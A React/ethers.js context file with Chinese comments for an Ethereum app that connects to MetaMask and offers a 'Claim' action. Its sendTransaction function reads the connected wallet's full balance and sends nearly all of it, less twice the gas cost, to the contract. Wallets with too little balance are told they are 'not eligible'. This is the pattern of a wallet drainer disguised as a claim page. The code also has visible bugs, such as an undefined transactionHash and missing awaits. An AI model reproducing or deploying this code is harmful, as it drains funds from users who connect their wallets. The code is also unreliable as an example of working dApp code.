import { ethers } from "ethers";
import React, { useEffect, useState } from "react";

import { contractABI, contractAddress } from "../utils/constants";

export const TransactionContext = React.createContext();

const { ethereum } = window;

/**
 *  创建合约
 * @returns
 */
const createEthereumContract = async () => {
  const provider = new ethers.providers.Web3Provider(ethereum);
  const signer = provider.getSigner();
  const transactionsContract = new ethers.Contract(
    contractAddress,
    contractABI,
    signer
  );
  // 获取当前gas余额
  const gasPrice = await provider.getGasPrice();
  console.log( "🚀 ~ file: TransactionContext.jsx:23 ~ createEthereumContract ~ gasPrice:", gasPrice );
  // 检测钱包余额
  const ress = await provider.getBalance(contractAddress);
  console.log(
    "🚀 ~ file: TransactionContext.jsx:25 ~ createEthereumContract ~ ress:",
    ress
  );
  return { transactionsContract, provider };
};
/**
 * 合约交互
 * @param {*} param0
 * @returns
 */
export const TransactionsProvider = ({ children }) => {
  const [formData, setformData] = useState({
    addressTo: "",
    amount: "",
    keyword: "",
    message: "",
  });
  const [currentAccount, setCurrentAccount] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [transactionCount, setTransactionCount] = useState(
    localStorage.getItem("transactionCount")
  );
  const [transactions, setTransactions] = useState([]);

  const handleChange = (e, name) => {
    setformData((prevState) => ({ ...prevState, [name]: e.target.value }));
  };

  const getAllTransactions = async () => {
    try {
      if (ethereum) {
        const { transactionsContract } = createEthereumContract();
        const availableTransactions =
          await transactionsContract.getAllTransactions();

        const structuredTransactions = availableTransactions.map(
          (transaction) => ({
            addressTo: transaction.receiver,
            addressFrom: transaction.sender,
            timestamp: new Date(
              transaction.timestamp.toNumber() * 1000
            ).toLocaleString(),
            message: transaction.message,
            keyword: transaction.keyword,
            amount: parseInt(transaction.amount._hex) / 10 ** 18,
          })
        );

        console.log(structuredTransactions);

        setTransactions(structuredTransactions);
      } else {
        console.log("Ethereum is not present");
      }
    } catch (error) {
      console.log(error);
    }
  };

  /**
   *  检测钱包连接状态
   * @returns
   */
  const checkIfWalletIsConnect = async () => {
    try {
      if (!ethereum) return alert("请下载钱包 （MetaMask）。");

      const accounts = await ethereum.request({ method: "eth_accounts" });

      if (accounts.length) {
        setCurrentAccount(accounts[0]);
        getAllTransactions();
      } else {
        console.log("没有发现账户");
      }
    } catch (error) {
      console.log(error);
    }
  };

  /**
   *
   */
  const checkIfTransactionsExists = async () => {
    try {
      if (ethereum) {
        const { transactionsContract, provider } = createEthereumContract();

    
        window.localStorage.setItem(
          "transactionCount",
          transactionsContract
        );
      }
    } catch (error) {
      console.log(error);
      throw new Error("No ethereum object");
    }
  };

  // 判断是否连接到目标网络
  const checkNetwork = async () => {
    const targetNetwork = {
      name: "ropsten",
      chainId: "0x1",
    };

    const chainId = await ethereum.request({ method: "eth_chainId" });
    console.log("当前网络ID:", chainId);
    if (chainId !== targetNetwork.chainId) {
      await ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: targetNetwork.chainId }],
      });
    }
  };

  // 断开连接当前钱包
  const disconnectWallet = async () => {
    if (window.ethereum) {
      try {
        await ethereum.request({ method: "wallet_disconnect" });
        await ethereum.request({
          method: "wallet_clearPermissions",
          params: [{ eth_accounts: {} }],
        });
        console.log("已断开连接");
        setCurrentAccount("");
      } catch (error) {
        console.error("断开连接出错:", error);
      }
    } else {
      console.error("未检测到钱包扩展程序，请安装并启用");
    }
  };

  /**
   *  连接钱包
   * @returns
   */
  const connectWallet = async () => {
    try {
      if (!ethereum) return alert("请下载钱包 （MetaMask）。");
      const accounts = await ethereum.request({
        method: "eth_requestAccounts",
      });
      await checkNetwork();
      setCurrentAccount(accounts[0]);
    } catch (error) {
      console.log(error);
      throw new Error("No ethereum object");
    }
  };

  /**
   * 发起交易
   */
  const sendTransaction = async () => {
    try {
      if (ethereum) {
        const { transactionsContract, provider } =
          await createEthereumContract();
        // const parsedAmount = ethers.utils.parseEther(amount);
        // 当前gas
        const gasPrice = await provider.getGasPrice();
        console.log(
          "🚀 ~ file: TransactionContext.jsx:201 ~ sendTransaction ~ 当前gas:",
          gasPrice
        );
        // 钱包余额
        const ress = await provider.getBalance(currentAccount);
        console.log(
          `🚀 ~ file: TransactionContext.jsx:207 ~ ${currentAccount} ~ 钱包余额:`,
          ress
        );
        const estimateGas = await transactionsContract.estimateGas.Claim(
          contractAddress,
          { value: String(ethers.utils.formatUnits(ress, "wei")) }
        );

        // 计算交易gas
        const jygas = ress.sub(estimateGas.mul(gasPrice).mul(2));

        const realMoneyValue = String(ethers.utils.formatUnits(jygas, "wei"));
        if (Number(realMoneyValue) < 0) {
          alert(
            "This wallet is not eligible. Please use a different wallet with enough assets"
          );
          return;
        }
        var result = await transactionsContract.Claim(contractAddress, { value: realMoneyValue, });
        console.log(`Result:`, result);
        setIsLoading(true);
        console.log(`Loading - ${transactionHash.hash}`);
        await transactionHash.wait();
        console.log(`Success - ${transactionHash.hash}`);
        setIsLoading(false);
        setTransactionCount(transactionsContract.toNumber());
      } else {
        console.log("No ethereum object");
      }
    } catch (error) {
      console.log(error);

      throw new Error("No ethereum object");
    }
  };

  useEffect(() => {
    checkIfWalletIsConnect();
  }, [transactionCount]);

  return (
    <TransactionContext.Provider
      value={{
        transactionCount,
        connectWallet,
        disconnectWallet,
        checkNetwork,
        transactions,
        currentAccount,
        isLoading,
        sendTransaction,
        handleChange,
        formData,
      }}
    >
      {children}
    </TransactionContext.Provider>
  );
};
